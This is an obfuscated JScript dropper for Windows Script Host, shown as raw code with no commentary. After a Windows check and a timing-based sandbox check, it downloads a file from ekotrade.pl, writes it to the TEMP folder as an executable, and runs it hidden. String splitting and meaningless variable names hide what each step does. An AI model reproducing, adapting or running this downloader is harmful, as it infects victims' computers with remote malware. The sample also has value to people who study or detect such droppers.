var G0 = false;
var L = "Create"+"Object";
var SI = function JO() {return WScript[L]("WScript"+".Shell");}(), BZ = 11;
var E = "MSXML2"+".XMLHTTP";
var YD = 2;
var RJ = YD - 2;
function AP(W){SI["Run"](W, RJ, RJ);};
function RA(){return E + "";};
function H(DS, H1){RJ = RJ * 1; return DS - H1;};
function KO(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    G0 = true;
  @end
@*/
if (G0)
{
var B = "";
function P(){return 22;};
var N0 = 0; var VI = 0;
function BW()
{
var PV = new this["Date"]();
var B0 = PV["getUTCMilliseconds"]();
WScript["Sleep"](P());
var PV = new this["Date"]();
var R = PV["getUTCMilliseconds"]();
WScript["Sleep"](P());
var PV = new this["Date"]();
var X0 = PV["getUTCMilliseconds"]();
var N0 = "K";
N0 = H(R, B0);
var VI = "IU";
VI = H(X0, R);
B = "open";
return H(N0, VI);
}
var C0 = false;
var AJ = false;
for (var M = RJ; M < P() * 1; M++){if (BW() != RJ){
C0 = true; 
VI = "31" + 11 * N0 + VI; 
AJ = true; 
break;
}}
function N() {return ((C0 == true) && (C0 == AJ)) ? 1 : RJ;};
if (C0 && N() && AJ){
function X() {return SI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5bYmesVwXy.ex" + "e";};
 H0 = RA();
 HO = WScript[L](H0);
 var YQ = 1;
do { 
	for (;YQ;){
	try {
		if (YQ == 1)
		{
			HO[B]("GET", "http://ekotrade.pl/m4ujda", false);
			HO["send"]();
			DI = "Sleep";
			YQ = 2;
		}
		WScript[DI](P() + 120); 
		if (HO["readystate"] < 2 * 2) continue;
		YQ = RJ;
		function A(PQ) {var C = (1, 2, 3, 4, 5, PQ); return C;};
		DI0 = WScript[KO()]("ADODB.Stream");
		H0 = DI0;
		H0[B]();
		H0["type"] = A(1);
		H0["write"](HO["ResponseBody"]);
		DI0["position"] = A(RJ);
		H0["Save" + "ToFile"](X(), 2);
		DI0["cl"+"ose"]();
		Z = X();
		AP(Z);
	} catch(G){};};
}while (YQ);
}
}

